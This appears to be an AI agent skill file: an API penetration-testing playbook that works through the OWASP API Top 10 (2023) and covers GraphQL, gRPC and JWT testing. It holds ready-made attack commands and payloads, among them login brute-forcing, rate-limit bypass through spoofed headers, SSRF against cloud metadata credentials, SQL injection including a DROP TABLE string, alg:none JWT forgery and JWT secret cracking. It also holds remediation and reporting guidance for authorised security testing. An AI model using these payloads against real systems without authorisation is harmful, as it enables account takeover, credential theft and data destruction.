---
id: api-security
name: API Security Testing Specialist
description: >
  API security testing specialist for REST, GraphQL, and gRPC APIs.
  Covers OWASP API Security Top 10 (2023) per-finding testing methodology,
  mass assignment via undocumented fields, broken function level authorization,
  excessive data exposure, rate limit bypass, JWT attacks, API versioning
  exploitation, gRPC reflection abuse, Postman fuzzing, and mitmproxy
  interception. Use when testing any API for security vulnerabilities.
triggers:
  - API security
  - REST pentest
  - API testing
  - API pentest
  - gRPC
  - gRPC reflection
  - OpenAPI
  - Swagger
  - broken authentication API
  - GraphQL injection
  - GraphQL security
  - GraphQL pentest
  - mass assignment API
  - rate limit bypass
  - JWT attack
  - excessive data exposure
  - broken object level authorization
  - BOLA
  - API versioning attack
version: "1.0"
author: fleet-complete-seat-18
created: 2026-10-30
references:
  - https://owasp.org/API-Security/editions/2023/en/0x00-header/
  - https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html
  - https://portswigger.net/web-security/graphql
  - https://github.com/nicowillis/grpc-pentest-notes
---

# API Security Testing — Specialist Playbook

## 1. Engagement Setup and Schema Discovery

### 1.1 Locate the API Schema

Before fuzzing blindly, find the machine-readable spec — it maps the entire
attack surface in minutes.

| Schema type | Common paths |
|---|---|
| OpenAPI / Swagger (REST) | `/swagger.json` `/swagger/v1/swagger.json` `/openapi.json` `/api-docs` `/v1/api-docs` `/docs` |
| Swagger UI (interactive) | `/swagger-ui.html` `/swagger-ui/` `/api/swagger-ui` |
| GraphQL introspection | `POST /graphql { "query": "{ __schema { types { name } } }" }` |
| gRPC server reflection | `grpc_cli ls <host>:<port>` |
| Postman collections | Search GitHub: `site:github.com "postman_collection" target.com` |
| JS source files | Extract from bundle: `python3 relative_url_extractor.py app.js` |

```bash
# Automated OpenAPI discovery:
python3 -m kiterunner scan https://target.com/api \
    -w /opt/kiterunner/routes-large.kite -o kr_hits.txt

# Or with ffuf on common paths:
ffuf -u https://target.com/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/api/openapi.txt \
     -mc 200,201,301,302 -o api_schema_hits.json
```

### 1.2 Import Schema to Testing Tools

```bash
# Convert OpenAPI → Postman collection for mass testing:
openapi-to-postman-cli convert -s swagger.json -o collection.json

# Import to Burp via OpenAPI Parser extension (BApp Store)
# → populates the site map with all endpoints automatically

# Generate attack traffic with schemathesis:
schemathesis run https://target.com/openapi.json \
    --auth "Bearer $TOKEN" \
    --checks all \
    --hypothesis-max-examples 100
```

---

## 2. OWASP API Security Top 10 (2023) — Per-Finding Methodology

### API1:2023 — Broken Object Level Authorization (BOLA/IDOR)
See the companion `idor-bac` skill for the full methodology. Quick summary:

```bash
# Two-account pattern: swap IDs between accounts
GET /api/v1/orders/USER_B_ORDER_ID
Authorization: Bearer USER_A_TOKEN

# Batch endpoint injection:
POST /api/v1/orders/bulk
{ "ids": [USER_A_ID, USER_B_ID, USER_C_ID] }
```

### API2:2023 — Broken Authentication

```bash
# 1. Brute-force login — check for rate limiting absence:
hydra -L users.txt -P rockyou.txt target.com \
    http-post-form "/api/auth/login:email=^USER^&password=^PASS^:invalid"

# 2. Default / weak credentials on internal API:
curl -s -u admin:admin https://target.com/api/internal/health

# 3. Token in URL (logged in proxy/server logs):
GET /api/data?access_token=eyJ...   ← token leaks to Referer header, logs

# 4. Predictable password reset tokens:
POST /api/auth/reset → observe token format; brute-force if sequential/short
```

### API3:2023 — Broken Object Property Level Authorization (Mass Assignment + Excessive Exposure)

**Excessive Data Exposure:** response returns fields the UI hides but the client
can still read.

```bash
# Compare UI-visible data vs raw API response:
GET /api/users/me
→ UI shows: name, email
→ Raw JSON also contains: password_hash, internal_role, ssn, payment_token

# Filter by response diff — Burp Comparer or jq:
curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/users/$ID | jq .
```

**Mass Assignment:**

```json
PATCH /api/users/me
{
  "name": "legit",
  "role": "admin",
  "is_admin": true,
  "credit_balance": 99999,
  "email_verified": true
}
```

### API4:2023 — Unrestricted Resource Consumption (Rate Limiting)

```bash
# Test absence of rate limiting on auth endpoint:
for i in $(seq 1 200); do
    curl -s -o /dev/null -w "%{http_code}\n" \
         -X POST https://target.com/api/auth/login \
         -d '{"email":"victim@example.com","password":"wrong'$i'"}'
done | sort | uniq -c
# Expected: 429 after N attempts. If only 200/401 = no rate limiting.

# Bypass existing rate limits:
# → Rotate IP via X-Forwarded-For header spoofing:
curl -H "X-Forwarded-For: 1.2.3.$i" ...

# → Add X-Real-IP, True-Client-IP, CF-Connecting-IP:
for ip in "1.1.1.$i" "2.2.2.$i"; do
    curl -H "X-Real-IP: $ip" ...
done

# → Null-byte / case variation in email:
victim@example.com
victim+1@example.com
VICTIM@example.com
victim@EXAMPLE.com
```

### API5:2023 — Broken Function Level Authorization (BFLA)

```bash
# 1. Access admin-only endpoints as regular user:
GET  /api/admin/users        → try with low-priv token
POST /api/admin/users/create → try with low-priv token
GET  /api/v1/internal/stats

# 2. Method escalation:
GET  /api/users/42  → 403
PUT  /api/users/42  → 200  (different code path, missing auth check)
DELETE /api/users/42 → 200

# 3. HTTP verb override:
POST /api/users/42
X-HTTP-Method-Override: DELETE

# Tools: Arjun for parameter discovery, kiterunner for endpoint enumeration
arjun -u https://target.com/api/users/42 --rate-limit 10
```

### API6:2023 — Unrestricted Access to Sensitive Business Flows

```bash
# Race condition — bypass purchase limits, coupon single-use, etc.:
# Using Burp Turbo Intruder (race_single_packet_attack.py):
# Send 20 identical coupon redemption requests in a single TCP packet

# Or with GNU parallel:
seq 1 20 | parallel -j20 \
    curl -s -X POST https://target.com/api/orders/redeem \
         -H "Authorization: Bearer $TOKEN" \
         -d '{"coupon":"SAVE50"}'
```

### API7:2023 — Server Side Request Forgery (SSRF via API)

```bash
# Webhook / URL import endpoints:
POST /api/webhooks
{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }

POST /api/import
{ "source_url": "http://internal-service.corp/admin" }

# DNS rebinding: use interactsh for out-of-band detection:
POST /api/webhooks
{ "url": "http://YOUR_INTERACTSH_SUBDOMAIN.oast.fun" }
```

### API8:2023 — Security Misconfiguration

```bash
# CORS misconfiguration:
curl -H "Origin: https://evil.com" -I https://target.com/api/users/me
# Look for: Access-Control-Allow-Origin: https://evil.com (or *)
#           Access-Control-Allow-Credentials: true

# Debug endpoints left exposed:
GET /api/debug
GET /api/actuator/env      ← Spring Boot
GET /api/metrics
GET /api/__debug__

# Stack traces in error responses:
POST /api/users/me
{ "name": { "nested": "object" } }   ← type confusion → stack trace
```

### API9:2023 — Improper Inventory Management (Versioning Attacks)

```bash
# Try deprecated/old versions with relaxed security:
curl https://target.com/api/v1/users/42
curl https://target.com/api/v2/users/42
curl https://target.com/api/v3/users/42
curl https://target.com/api/beta/users/42
curl https://target.com/api/internal/users/42
curl https://target.com/api/dev/users/42

# Check Accept header version switching:
curl -H "Accept: application/vnd.target.v1+json" https://target.com/api/users/42
curl -H "API-Version: 1" https://target.com/api/users/42
```

### API10:2023 — Unsafe Consumption of APIs (Third-Party API Trust)

Test whether the application blindly trusts data from third-party APIs it
aggregates (supply chain injection).

```bash
# If the app fetches data from a third-party and reflects it:
# → Control the third-party response (DNS rebind, MITM, controlled endpoint)
# → Inject payloads in third-party-controlled fields
# → Look for stored XSS via third-party feed data
```

---

## 3. GraphQL Security Testing

### 3.1 Introspection (Schema Enumeration)

```bash
# Enable if disabled (send fragment to bypass naive block):
POST /graphql
{
  "query": "query IntrospectionQuery { __schema { queryType { name }
    types { name fields { name args { name type { name } } } } } }"
}

# Bypass naive introspection block (replace __schema with __Schema):
{ "query": "{ __Schema { types { name } } }" }

# Use graphql-voyager for visual map:
# https://github.com/graphql-kit/graphql-voyager
```

### 3.2 Batch / Alias Attack (Rate Limit Bypass)

```graphql
# GraphQL aliases allow multiple queries in one HTTP request:
query {
  login1: login(email:"victim@example.com", password:"password1") { token }
  login2: login(email:"victim@example.com", password:"password2") { token }
  login3: login(email:"victim@example.com", password:"password3") { token }
  # ... up to hundreds of aliases in a single request
}
```

Mitigation check: confirm server enforces per-alias rate limits, not just
per-request.

### 3.3 Field Suggestion / Enumeration

```bash
# GraphQL returns suggestions on typos — exploit to enumerate hidden fields:
query { user { pasword } }
→ "Did you mean 'password'?"
```

### 3.4 Injection via Variables

```graphql
query GetUser($id: String!) {
  user(id: $id) { name email }
}
# Variables:
{ "id": "1 OR 1=1" }              ← SQLi
{ "id": "1; DROP TABLE users;" }   ← SQLi
{ "id": "{{7*7}}" }                ← SSTI
```

### 3.5 Tools

```bash
# Automated GraphQL scanning:
python3 -m graphw00f -d -t https://target.com/graphql   # fingerprint
python3 -m graphqlmap -u https://target.com/graphql      # introspect + attack

# Or Clairvoyance for introspection-disabled targets:
python3 -m clairvoyance -u https://target.com/graphql \
    -w /usr/share/seclists/Discovery/Web-Content/graphql.txt
```

---

## 4. gRPC Security Testing

### 4.1 Reflection Attack (Schema Disclosure)

gRPC server reflection exposes all service and message definitions — equivalent
to introspection in GraphQL.

```bash
# Check if reflection is enabled:
grpc_cli ls <target_host>:<port>

# List all services:
grpc_cli ls <host>:<port> --l

# Describe a service:
grpc_cli describe <host>:<port> com.example.UserService

# Invoke a method:
grpc_cli call <host>:<port> com.example.UserService.GetUser \
    "user_id: 'victim_id'"
```

### 4.2 grpcurl (curl for gRPC)

```bash
# With reflection:
grpcurl -plaintext <host>:<port> list
grpcurl -plaintext <host>:<port> describe com.example.UserService
grpcurl -plaintext -d '{"user_id":"victim"}' \
    <host>:<port> com.example.UserService/GetUser

# With proto file (no reflection):
grpcurl -proto user_service.proto -d '{"user_id":"victim"}' \
    <host>:<port> com.example.UserService/GetUser
```

### 4.3 mitmproxy for gRPC Interception

```bash
# gRPC runs over HTTP/2 — mitmproxy with http2 support:
mitmproxy --mode transparent --ssl-insecure --set http2=true

# Or with Burp Suite (enable HTTP/2 in Project Options):
# Add certificate to trust store, set proxy, intercept binary frames
```

### 4.4 gRPC-Specific Attack Vectors

```bash
# Metadata injection (headers in gRPC = metadata):
grpcurl -H "Authorization: Bearer TAMPERED_TOKEN" ...
grpcurl -H "x-user-role: admin" ...

# Protobuf type confusion:
# Send wrong field type → undefined behavior → crash or info leak

# Insecure gRPC-web (transcoded to HTTP/1.1):
# Test via standard HTTP tools after identifying /twirp/ or grpc-web endpoints
```

---

## 5. JWT Attacks

### 5.1 Algorithm Manipulation

```bash
# alg:none — strip signature:
python3 -c "
import base64, json
h = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
print(f'{h}.{p}.')
"

# RS256 → HS256 key confusion:
# 1. Fetch public key: curl https://target.com/.well-known/jwks.json
# 2. Sign with public key as HMAC secret using jwt_tool:
python3 jwt_tool.py <JWT> -X k -pk public.pem
```

### 5.2 Brute-Force Weak Secret

```bash
hashcat -a 0 -m 16500 target.jwt /usr/share/wordlists/rockyou.txt
# Custom wordlist based on company name, domain, env variables:
echo -e "secret\njwt_secret\ncompanyname123\nsupersecret" > custom.txt
hashcat -a 0 -m 16500 target.jwt custom.txt
```

### 5.3 JWT Claim Tampering

```bash
# jwt_tool — decode, tamper, re-sign:
python3 jwt_tool.py <JWT> -T        # interactive tamper
python3 jwt_tool.py <JWT> -I -pc role -pv admin  # inject claim
```

### 5.4 jwk Header Injection

```bash
# Server trusts 'jwk' header to verify signature — attacker embeds own key:
python3 jwt_tool.py <JWT> -X i      # jwk injection attack
```

---

## 6. mitmproxy for API Interception

### 6.1 Setup

```bash
# Install:
pip install mitmproxy

# Start transparent proxy:
mitmproxy -p 8080

# Configure target app to use 127.0.0.1:8080 as HTTP proxy
# Install mitmproxy CA cert: https://mitm.it/

# Mobile app interception (via Wi-Fi hotspot):
sudo mitmproxy --mode transparent -p 8080 --ssl-insecure
```

### 6.2 Scripted API Interception

```python
# mitmproxy addon — auto-tamper user IDs:
# addon_tamper_id.py
from mitmproxy import http

class TamperID:
    def request(self, flow: http.HTTPFlow):
        if "/api/orders/" in flow.request.path:
            # Replace numeric ID in path with target ID
            import re
            flow.request.path = re.sub(r'/orders/\d+', '/orders/99999',
                                        flow.request.path)

addons = [TamperID()]
```

```bash
mitmproxy -s addon_tamper_id.py
```

### 6.3 Postman Collection Fuzzing

```bash
# Generate collection from OpenAPI:
openapi2postmanv2 -s openapi.json -o collection.json -p

# Run with Newman (Postman CLI):
newman run collection.json \
    --env-var "base_url=https://target.com" \
    --env-var "auth_token=$TOKEN" \
    --iteration-count 1000 \
    --iteration-data fuzz_ids.csv \  ← CSV with ID values to fuzz
    --reporters cli,json --reporter-json-export results.json
```

---

## 7. API Security Recon Checklist

Before active testing, gather this information:

```
[ ] Locate OpenAPI/Swagger spec (§1.1)
[ ] Map all versioned endpoints (/v1, /v2, /beta, /internal)
[ ] Identify authentication mechanism (JWT, API key, OAuth, session cookie)
[ ] Confirm rate limiting presence on login/reset endpoints
[ ] Test CORS policy headers
[ ] Check for debug/actuator endpoints
[ ] Verify HTTPS-only (no HTTP endpoint that redirects)
[ ] Confirm authorization header is required on all non-public endpoints
[ ] Find GraphQL endpoint + test introspection
[ ] Check gRPC reflection
[ ] Search for API keys in JS source files
```

---

## 8. Tools Quick Reference

| Tool | Purpose | Install |
|---|---|---|
| Burp Suite Pro | Full API interception, Intruder, Scanner | https://portswigger.net |
| mitmproxy | Scriptable proxy; HTTP/2 + gRPC support | `pip install mitmproxy` |
| schemathesis | OpenAPI property-based fuzzer | `pip install schemathesis` |
| kiterunner | API endpoint discovery with route files | `go install github.com/assetnote/kiterunner/cmd/kr@latest` |
| jwt_tool | JWT decode/tamper/attack suite | `pip install jwt_tool` |
| grpcurl | gRPC CLI client (reflection-aware) | `brew install grpcurl` |
| grpc_cli | Official gRPC CLI | `apt install grpc-tools` |
| graphw00f | GraphQL engine fingerprinter | `pip install graphw00f` |
| graphqlmap | GraphQL interactive mapper + injector | `pip install graphqlmap` |
| Clairvoyance | GraphQL field enumeration without introspection | `pip install clairvoyance` |
| Arjun | HTTP parameter discovery | `pip install arjun` |
| ffuf | Fast endpoint/parameter fuzzing | `go install github.com/ffuf/ffuf/v2@latest` |
| Newman | Postman collection CLI runner + fuzzing | `npm install -g newman` |
| hashcat | JWT HMAC secret brute-force | `apt install hashcat` |
| Postman | Manual API exploration + collection building | https://www.postman.com |
| SecLists | Wordlists (API paths, parameters, payloads) | `/usr/share/seclists` |

---

## 9. Reporting Template

```
Title: [API Security Finding] — [OWASP API Top 10 Category] — [Endpoint]
CVSS: [score] ([vector])
Endpoint: [METHOD] /api/v1/...

Summary:
[One paragraph: what the vulnerability is, why it exists, what impact it enables]

Proof of Concept:
1. [Step-by-step reproduction]
2. Request:
   [Exact request headers + body]
3. Response:
   [Exact response showing the vulnerability]

Impact:
[Concrete impact: data exposed, actions enabled, blast radius]

Remediation:
[Specific fix: code pattern, config change, or architectural change]
[Reference: OWASP API Security recommendation for this finding]
```

---

## 10. OWASP API Top 10 (2023) — Quick Reference Card

| # | Name | Key Test | Primary Fix |
|---|---|---|---|
| API1 | BOLA (IDOR) | Swap IDs between accounts | Server-side ownership check |
| API2 | Broken Authentication | Brute-force, token analysis | Rate limit + strong token validation |
| API3 | Broken Object Property Level Auth | Mass assignment + excessive exposure | Allowlist fields; filter response |
| API4 | Unrestricted Resource Consumption | No rate limit on expensive ops | Rate limiting + resource quotas |
| API5 | Broken Function Level Auth | Access admin endpoints as user | RBAC on every function |
| API6 | Unrestricted Access to Sensitive Business Flows | Race conditions | Business-logic rate limits + idempotency |
| API7 | SSRF | Webhook/URL import to internal | Allowlist outbound URLs |
| API8 | Security Misconfiguration | CORS, debug endpoints, verbose errors | Harden all environments identically |
| API9 | Improper Inventory Management | Old API version with relaxed controls | Decommission old versions; version parity |
| API10 | Unsafe Consumption of APIs | Inject via third-party data | Validate and sanitize third-party input |
